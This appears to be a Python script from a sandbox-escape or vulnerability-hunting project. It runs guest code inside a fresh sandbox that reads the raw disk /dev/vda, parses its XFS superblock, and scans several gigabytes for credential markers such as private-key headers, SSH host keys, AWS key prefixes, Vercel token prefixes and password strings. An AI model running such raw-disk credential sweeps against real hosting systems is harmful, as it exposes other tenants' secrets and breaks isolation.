# -*- coding: utf-8 -*-
"""Phase34: vda 凭据/多租户扫描 段1 (512MB-6GB) + sb 修正解析"""
import sys, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM, fresh_sandbox_deny_all

GUEST = r'''
import os

# 修正 XFS superblock 解析
fd = os.open('/dev/vda', os.O_RDONLY)
sb = os.pread(fd, 1024, 0)
import struct
magic = sb[0:4]
blocksize = struct.unpack('<I', sb[4:8])[0]
dblocks = struct.unpack('<Q', sb[8:16])[0]
rootino = struct.unpack('<Q', sb[56:64])[0]   # sb_rootino at 0x38
agcount = struct.unpack('<I', sb[72:76])[0]   # sb_agcount at 0x48
agblocks = struct.unpack('<I', sb[76:80])[0]  # sb_agblocks at 0x4c
inodesize = struct.unpack('<H', sb[88:90])[0] # sb_inodesize at 0x58
inopblock = struct.unpack('<H', sb[90:92])[0] # sb_inopblock at 0x5a
logstart = struct.unpack('<Q', sb[48:56])[0]  # sb_logstart at 0x30
print('[sb2] magic=%r bs=%d dblocks=%d rootino=%d agcount=%d agblocks=%d inodesize=%d inopblock=%d logstart=%d'
      % (magic, blocksize, dblocks, rootino, agcount, agblocks, inodesize, inopblock, logstart), flush=True)
os.close(fd)

# 扫描段 1: 512MB - 6GB
KEYS = [b'BEGIN RSA PRIVATE KEY', b'BEGIN EC PRIVATE KEY', b'BEGIN OPENSSH PRIVATE KEY',
        b'BEGIN PRIVATE KEY', b'authorized_keys', b'ssh_host_rsa', b'ssh_host_ed25519',
        b'-----BEGIN CERTIFICATE', b'ca.key', b'proxy-ca', b'/run/cell/', b'/volumes/',
        b'/var/lib/containerd', b'/root/.ssh', b'/home/', b'vcp_', b'sbx_', b'team_',
        b'AWS_SECRET', b'AKIA', b'password=', b'api.vercel.com', b'OIDC', b'oidc']
start = 512 * 1024 * 1024
end = 6 * 1024 * 1024 * 1024
hits = {}
fd = os.open('/dev/vda', os.O_RDONLY)
total = 0
for off in range(start, end, 4 * 1024 * 1024):
    try:
        chunk = os.pread(fd, 4 * 1024 * 1024, off)
    except Exception:
        break
    total += len(chunk)
    for k in KEYS:
        idx = 0
        while True:
            idx = chunk.find(k, idx)
            if idx < 0:
                break
            s = max(0, idx - 60)
            e = min(len(chunk), idx + len(k) + 200)
            hits.setdefault(k.decode('latin1'), []).append(
                'off=0x%x' % (off + idx))
            idx += len(k)
os.close(fd)
print('[scan1] total=%d MB' % (total // 1024 // 1024), flush=True)
for k, v in hits.items():
    print('== %s (%d) ==' % (k, len(v)), flush=True)
    for item in v[:15]:
        print('   %s' % item, flush=True)
print('done', flush=True)
'''
code = "cat > /tmp/pg42.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg42.py"

if __name__ == "__main__":
    sid = fresh_sandbox_deny_all("fwtest14")
    time.sleep(2)
    c, r = cmd(sid, "bash", ["-lc", code], timeout_ms=200000)
    print('cmd:', c, flush=True)
    print(r[:9000], flush=True)
